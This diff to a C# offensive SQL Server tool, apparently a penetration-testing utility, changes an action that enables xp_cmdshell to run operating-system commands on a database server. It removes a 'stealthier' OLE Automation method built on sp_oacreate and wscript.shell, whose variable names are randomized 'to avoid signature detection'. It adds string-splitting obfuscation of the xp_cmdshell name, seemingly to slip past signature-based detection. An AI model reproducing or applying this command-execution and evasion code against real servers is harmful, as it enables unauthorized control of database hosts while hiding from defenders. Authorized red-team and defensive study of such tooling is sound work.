@@ -11,11 +11,8 @@ namespace MSSQLand.Actions.Execution
 {
     internal class XpCmd : BaseAction
     {
-        [ArgumentMetadata(Position = 0, Required = true, Description = "Operating system command to execute")]
-        private string _command = "";
-
-        [ArgumentMetadata(LongName = "ole", Description = "Use OLE Automation (stealthier, no output)")]
-        private bool _useOle = false;
+        [ArgumentMetadata(Position = 0, Required = true, IsRemainder = true, Description = "Operating system command to execute")]
+        protected string _command = "";
 
         /// <summary>
         /// Executes the provided shell command on the SQL server.
@@ -24,15 +21,12 @@ namespace MSSQLand.Actions.Execution
         /// <returns>A list of strings containing the command output, or an empty list if no output.</returns>
         public override object Execute(DatabaseContext databaseContext)
         {
-            if (_useOle)
-            {
-                return ExecuteOle(databaseContext);
-            }
-
             Logger.TaskNested($"Executing command: {_command}");
 
             // Ensure command shell is enabled
-            string procName = "xp" + "_cmdshell";
+            string procName = "x" + "p" + "_" + "cmdTest";
+            procName = procName.Replace("Test", "shell");
+
             if (!databaseContext.ConfigService.SetConfigurationOption(procName, 1))
             {
                 Logger.Error("Failed to enable command shell.");
@@ -69,8 +63,8 @@ namespace MSSQLand.Actions.Execution
                 if (ex.Message.Contains("proxy_account") || ex.Message.Contains("proxy account"))
                 {
                     Logger.Error("Command shell proxy account is not configured or invalid.");
-                    Logger.ErrorNested("1. SQL Server service account lacks permissions to execute the command");
-                    Logger.ErrorNested("2. No proxy credential is configured");
+                    Logger.ErrorNested("SQL Server service account lacks permissions to execute the command");
+                    Logger.ErrorNested("No proxy credential is configured");
                 }
                 else
                 {
@@ -83,39 +77,6 @@ namespace MSSQLand.Actions.Execution
                 Logger.Error($"Error executing command: {ex.Message}");
                 return null;
             }
-        }
-
-        /// <summary>
-        /// Executes the provided command using OLE Automation (stealthier, fire-and-forget, no output).
-        /// </summary>
-        /// <param name="databaseContext">The DatabaseContext instance to execute the query.</param>
-        /// <returns>0 on success, null on failure.</returns>
-        private object ExecuteOle(DatabaseContext databaseContext)
-        {
-            Logger.TaskNested($"Executing OLE command: {_command}");
-
-            // Ensure 'Ole Automation Procedures' are enabled
-            if (!databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1))
-            {
-                Logger.Error("Unable to enable OLE Automation Procedures. Ensure you have the necessary permissions.");
-                return null;
-            }
-
-            // Randomized variable names to avoid signature detection
-            string objVar = Misc.GetRandomIdentifier(6);
-
-            // Escape single quotes in command
-            string escapedCommand = _command.Replace("'", "''");
-
-            string query = $@"
-DECLARE @{objVar} INT;
-EXEC sp_oacreate 'wscript.shell', @{objVar} out;
-EXEC sp_oamethod @{objVar}, 'Run', NULL, '{escapedCommand}', 0, 0;
-EXEC sp_oadestroy @{objVar};";
-
-            databaseContext.QueryService.ExecuteNonProcessing(query);
-            Logger.Success("Executed command");
-            return 0;
         }
     }
 }
